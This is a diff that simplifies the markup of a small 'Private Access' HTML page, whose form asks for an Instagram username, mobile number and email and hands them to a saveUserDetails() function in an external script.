@@ -1,39 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <title>Private Access</title>
-  <meta charset="UTF-8">
-  <link rel="stylesheet" href="style.css">
+<title>Private Access</title>
+<link rel="stylesheet" href="style.css">
 </head>
 <body>
 
 <div class="card">
-  <h1>Welcome</h1>
-  <p>Private • Secure • Invitation-only</p>
+<h1>Welcome</h1>
 
-  <!-- WARNING BOX (REQUIRED) -->
-  <div id="warningBox" style="
-    display:none;
-    background: rgba(255, 80, 80, 0.18);
-    color: #ffd1d1;
-    padding: 12px;
-    border-radius: 12px;
-    margin-bottom: 14px;
-    font-size: 14px;
-  "></div>
+<div id="warningBox" style="display:none;background:rgba(255,0,0,.2);padding:10px;border-radius:10px;margin-bottom:12px;"></div>
 
-  <!-- INPUTS -->
-  <input type="text" id="instagram" placeholder="Instagram Username">
-  <input type="tel" id="mobile" placeholder="Mobile Number">
-  <input type="email" id="email" placeholder="Email Address">
+<input id="instagram" placeholder="Instagram Username">
+<input id="mobile" placeholder="Mobile Number">
+<input id="email" placeholder="Email Address">
 
-  <!-- IMPORTANT: type='button' -->
-  <button
-    type="button"
-    class="btn btn-gold"
-    onclick="saveUserDetails()">
-    Continue
-  </button>
+<button class="btn btn-gold" type="button" onclick="saveUserDetails()">Continue</button>
 </div>
 
 <script src="script.js"></script>
